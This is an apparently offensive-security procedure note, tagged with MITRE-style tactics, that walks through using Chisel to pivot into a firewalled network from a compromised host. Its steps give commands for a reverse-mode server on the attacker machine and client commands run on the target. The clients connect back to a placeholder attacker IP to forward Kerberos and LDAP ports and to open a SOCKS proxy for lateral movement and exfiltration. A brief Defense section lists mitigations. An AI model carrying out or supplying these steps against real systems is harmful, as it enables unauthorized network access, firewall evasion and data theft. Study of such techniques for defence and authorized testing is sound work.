---
type: procedure
tactics:
  - '[[Command and Control]]'
  - '[[Exfiltration]]'
techniques:
  - '[[Connection Proxy]]'
  - '[[Exfiltration Over Command and Control Channel]]'
sub_techniques: []
tags:
  - chisel
  - network-pivoting
commands:
  - '[[commands/chisel-install-via-go]]'
  - '[[commands/chisel-server-reverse-mode]]'
  - '[[commands/chisel-client-port-forward]]'
  - '[[commands/chisel-client-socks-proxy]]'
tools:
  - '[[tools/Chisel]]'
platforms:
  - Linux
  - Windows
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# chisel-port-forwarding-and-socks-proxy-network-pivoting

## Summary

This procedure uses the Chisel tool to establish encrypted tunnels for port forwarding and SOCKS proxying, enabling network pivoting from a compromised system within a target network to bypass firewalls and access restricted resources. It allows attackers to forward specific ports or create a SOCKS proxy for broader lateral movement and data exfiltration.

## Description

Chisel is a fast TCP/UDP tunnel over HTTP, built with Go, that supports reverse tunneling to pivot through network restrictions. In an attack scenario, after gaining initial access to a system in the target network (e.g., via phishing or exploitation), an attacker deploys Chisel to create secure tunnels. The server runs on the attacker's machine in reverse mode, and the client on the compromised host connects back, forwarding traffic for services like LDAP (port 389) or Kerberos (port 88) or enabling SOCKS for proxied access. This facilitates lateral movement, command and control, and exfiltration over the tunnel. The target environment typically involves firewalled corporate networks with segmented access, where direct connections are blocked.

## Requirements

1. Initial foothold on a target system with outbound internet access to the attacker's listener.
2. Chisel binary installed on both attacker and target systems (compiled for the target's OS/architecture).
3. Attacker machine with a public or reachable IP and open port (e.g., 8008) for the Chisel server.
4. Go environment on the build machine for installation if compiling from source.

## Defense

- Implement network segmentation and zero-trust access controls to limit lateral movement.
- Monitor for anomalous outbound connections, especially to non-standard ports or encrypted HTTP traffic resembling tunneling.
- Deploy EDR tools to detect process execution of unknown binaries like chisel.exe and unusual network patterns.
- Use application-layer firewalls to block unauthorized port forwarding or proxy traffic.

## Objectives

1. Establish a persistent encrypted tunnel for network pivoting.
2. Forward specific ports to access internal services from the attacker's machine.
3. Create a SOCKS proxy for routing traffic through the compromised host to the internal network.
4. Enable lateral movement and data exfiltration while evading firewall restrictions.

## Instructions

### Step 1: Install Chisel on Attacker and Target Systems

**Context**: Chisel must be installed or compiled on both sides to enable tunneling. Use Go to fetch and build the binary, ensuring compatibility with the target's platform (e.g., Windows for .exe).

**Command** ([[commands/chisel-install-via-go]]):
```bash
go get -v github.com/jpillora/chisel
```

> This command downloads and builds the Chisel binary in your GOPATH. On the target, transfer the compiled binary (e.g., chisel.exe for Windows) via existing access methods like SMB or HTTP. Verify installation by running `./chisel --version` or `chisel.exe --version` to confirm the tool is ready.

### Step 2: Start Chisel Server in Reverse Mode on Attacker Machine

**Context**: The server listens for incoming client connections from the target and handles reverse tunneling requests, allowing the target to push ports back to the attacker despite inbound firewall blocks.

**Command** ([[commands/chisel-server-reverse-mode]]):
```bash
/opt/chisel/chisel server -p 8008 --reverse
```

> Run this on the attacker's machine (adjust path if needed). The server binds to port 8008 and enables reverse mode (--reverse) for client-initiated tunnels. Expected output includes a message like "Server started on 0.0.0.0:8008". Keep this running to accept client connections.

### Step 3: Connect Client for Port Forwarding on Target Machine

**Context**: On the compromised target, the client connects to the server and specifies ports to forward (e.g., 88 for Kerberos, 389 for LDAP), mapping them to localhost services for attacker access.

**Command** ([[commands/chisel-client-port-forward]]):
```bash
chisel.exe client YOUR_IP:8008 R:88:127.0.0.1:88 R:389:localhost:389
```

> Replace YOUR_IP with the attacker's IP. The 'R:' prefix indicates reverse forwarding. This tunnels target ports 88 and 389 to the attacker's localhost equivalents. Expected output: Connection confirmation and tunnel status like "88: [connected]". Test by accessing localhost:88/389 on the attacker machine to reach target services.

### Step 4: Connect Client for SOCKS Proxy on Target Machine

**Context**: For broader pivoting, create a dynamic SOCKS proxy on the target, allowing the attacker to route any traffic through it to internal network resources.

**Command** ([[commands/chisel-client-socks-proxy]]):
```bash
chisel.exe client YOUR_IP:8008 R:socks
```

> This establishes a SOCKS5 proxy on the attacker's localhost:1080 (default). Expected output: "socks: [connected]". Configure tools like Proxychains or browser proxies to use 127.0.0.1:1080 for routing traffic via the target.

### Step 5: Verify and Use Tunnels

**Context**: Confirm tunnels are active and utilize them for pivoting. Monitor for errors like connection timeouts, which may indicate firewall blocks or IP issues.

If port forwarding succeeds, use tools like nmap or telnet on the attacker's localhost to interact with forwarded services. For SOCKS, test with `curl --socks5 localhost:1080 http://internal-host`. If connection fails, check server logs and ensure the client has outbound access.
